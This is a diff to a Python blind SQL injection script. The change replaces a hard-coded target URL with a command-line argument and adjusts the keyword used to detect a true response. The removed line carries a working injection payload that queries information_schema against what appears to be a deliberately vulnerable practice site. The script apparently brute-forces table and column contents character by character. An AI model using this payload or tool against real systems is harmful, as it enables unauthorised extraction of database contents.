@@ -1,13 +1,14 @@
 __author__="AdminTony"
 
 import requests,time,random,sys,threading
+from src.core.parser.cmdline import url  as _url
 
 #将所有打印字符的ascii码放在list里面,打印字符从32-127 直接用列表生成式
 list=[i for i in range(32,128)]
 #Target URL
-url = "https://hack-yourself-first.com/Make/5?orderby=supercarid-1%20or%20(select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database())=189"
+url = _url
 #keyword 用于判断页面是否正确
-keyword ="remote signature"
+keyword ="Application"
 headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"}
 
 table_list=[]
@@ -374,7 +375,7 @@ def run_value(table_name,*column_name):
 
 
 def main():
-    info = Info()
+    # info = Info()
 
     run()
 if __name__ == '__main__':
